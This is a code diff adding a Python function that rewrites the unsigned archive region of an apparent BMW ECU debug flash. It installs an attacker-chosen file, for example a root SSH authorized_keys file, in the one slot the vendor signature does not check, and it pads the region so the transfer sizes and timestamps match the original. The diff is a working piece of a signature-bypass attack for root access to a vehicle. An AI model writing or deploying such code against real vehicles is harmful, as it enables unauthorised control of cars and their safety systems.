@@ -114,6 +114,49 @@ def file_region(path, data, mode=FILE_MODE, mtime=0):
     return build_region(files)
 
 
+def _walk_records(blob):
+    """Yield (path, comp, typ, mtime) for each record in *blob*, in order."""
+    off = len(HEADER)
+    while off + 92 <= len(blob) and struct.unpack_from('<I', blob, off)[0] == _MARKER:
+        w = struct.unpack_from('<23I', blob, off)
+        plen, comp, typ, mtime = w[1], w[3], w[5], w[13]
+        path = blob[off + 92: off + 92 + plen].decode('utf-8')
+        yield path, comp, typ, mtime
+        off += 92 + plen + 28
+
+
+def replace_region_with_file(region, path, data, mode=FILE_MODE, mtime=None,
+                             pad_to=None):
+    """Return a new unsigned HAR region that installs ONLY *path*/*data* (plus its
+    parent-directory chain), replacing whatever the original *region* carried.
+
+    The debug flash writes one unsigned HAR region (the real image's holds just
+    /etc/ssl/certs/debugCA.pem). This swaps that single unchecked file for our own
+    (e.g. /usr/share/sshd/authorized_keys.root), so the flash drops our key in the
+    one slot that is not covered by the BMW signature.
+
+    By default the result is zero-padded to the original region's byte length
+    (*pad_to*), so the region keeps the exact same size the flash already sends -
+    the RequestDownload size byte and the TransferData block lengths stay
+    identical, and only the content bytes differ. The HAR parser reads each entry
+    by its stored size and stops, so the trailing zero padding is ignored. New
+    entries reuse the original region's newest mtime so the archive stays
+    internally consistent."""
+    if region[:8] != MAGIC:
+        raise ValueError('not a HAR region')
+    if pad_to is None:
+        pad_to = len(region)
+    if mtime is None:
+        mts = [mt for _p, _c, _t, mt in _walk_records(region)]
+        mtime = max(mts) if mts else 0
+    files = dirs_for(path, mtime) + [HarFile(path, data=data, mode=mode, mtime=mtime)]
+    blob = build_region(files)
+    if len(blob) > pad_to:
+        raise ValueError('replacement region (%d B) exceeds the original (%d B); '
+                         'cannot preserve the transfer shape' % (len(blob), pad_to))
+    return blob + b'\x00' * (pad_to - len(blob))
+
+
 def parse_region(blob):
     """Parse a HAR region into a list of (path, is_dir, mode, data). Mirrors
     build_region; used by the self-test."""
